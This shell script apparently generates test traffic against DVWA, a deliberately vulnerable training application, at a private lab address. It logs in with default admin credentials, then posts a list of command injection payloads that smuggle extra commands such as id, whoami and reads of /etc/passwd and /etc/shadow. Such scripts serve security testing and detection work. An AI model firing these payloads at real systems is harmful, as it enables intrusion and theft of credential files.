#!/bin/bash
set -eu

RUN_ID="${1:-no-run-id}"
TARGET_IP="${TARGET_IP:-192.168.50.10}"
SESSION_FILE="/tmp/dvwa_cmdi_${RUN_ID}.txt"

echo "[run_id=$RUN_ID] Command injection probe starting target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# Establish authenticated DVWA session
curl -s -c "$SESSION_FILE" -b "" \
  -X POST "http://$TARGET_IP/dvwa/login.php" \
  -d "username=admin&password=password&Login=Login" -L -o /dev/null || true

# POST payloads to DVWA command injection endpoint (/dvwa/vulnerabilities/exec/)
PAYLOADS=(
  "127.0.0.1%3Bid"
  "127.0.0.1%7Cwhoami"
  "127.0.0.1%26%26cat%20/etc/passwd"
  "127.0.0.1%3B%20ls%20-la%20/"
  "%24%28sleep%201%29"
  "%60id%60"
  "127.0.0.1+%7C%7C+cat+/etc/shadow"
)

for payload in "${PAYLOADS[@]}"; do
  curl -s -o /dev/null -m 4 -b "$SESSION_FILE" \
    -X POST "http://$TARGET_IP/dvwa/vulnerabilities/exec/" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "ip=$payload&Submit=Submit" || true
done

rm -f "$SESSION_FILE" || true
echo "[run_id=$RUN_ID] Command injection probe done target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
